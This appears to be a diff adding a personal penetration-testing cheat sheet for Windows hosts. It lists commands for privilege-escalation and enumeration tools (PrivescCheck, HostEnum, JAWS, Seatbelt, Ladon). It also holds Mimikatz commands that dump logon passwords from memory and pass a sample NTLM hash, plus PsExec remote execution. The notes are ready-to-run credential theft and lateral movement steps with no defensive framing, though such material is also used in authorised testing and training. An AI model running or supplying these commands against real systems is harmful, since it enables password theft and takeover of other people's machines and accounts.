@@ -1,0 +1,82 @@
+
+####################################
+PrivescCheck
+####################################
+
+This is good for finding priv esc issues .. shows a nice table at the end
+
+. .\PrivescCheck.ps1
+Invoke-PrivescCheck | Tee C:\Windows\Temp\PrivescCheck.txt
+Invoke-PrivescCheck -Extended | Tee C:\windows\temp\PrivescCheck.txt
+
+
+
+
+####################################
+HostEnum
+####################################
+
+. .\HostEnum.ps1
+
+Invoke-HostEnum -All -HTMLReport | Tee HostEnum.txt
+
+
+
+
+####################################
+JAWS
+####################################
+
+.\jaws-enum.ps1 | Tee C:\Windows\Temp\JAWS.txt
+
+
+
+
+####################################
+SeatBelt
+####################################
+.\Seatbelt3.exe -group=all -outputfile="C:\Windows\Temp\SeatBelt.txt"
+
+type C:\Windows\Temp\SeatBelt.txt
+
+
+
+
+####################################
+Ladon
+####################################
+ .\Ladon.exe GetInfo
+ 
+ 
+ 
+####################################
+Mimikatz
+####################################
+
+Make sure to copy the dlls with the exe aswell 
+
+Dump Passwords
+
+.\mimikatz.exe "privilege::debug" "log passthehash.log" "sekurlsa::logonpasswords"
+
+
+Pass the Hash 
+
+.\mimikatz.exe "sekurlsa::pth /user:JoeD /domain:domain.com /ntlm:eed224b4784bb040aab50b8856fe9f02"
+
+
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:UserName /domain:DomainName /ntlm:HASH /run:powershell.exe"'
+
+
+
+
+
+
+
+#########################
+PSExc
+#########################
+
+
+
+.\PSExec.exe \\server1 cmd.exe
